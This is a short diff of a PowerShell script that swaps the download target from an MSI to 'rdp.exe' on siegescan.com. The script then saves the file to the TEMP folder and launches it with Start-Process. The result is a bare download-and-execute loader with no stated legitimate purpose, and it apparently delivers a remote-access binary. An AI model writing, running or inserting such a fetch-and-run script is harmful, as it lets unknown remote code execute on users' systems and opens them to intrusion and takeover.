@@ -1,5 +1,5 @@
-$exeUrl = "https://siegescan.com/Stat.msi"
-$exePath = "$env:TEMP\Stat.msi"
+$exeUrl = "https://siegescan.com/rdp.exe"
+$exePath = "$env:TEMP\rdp.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath
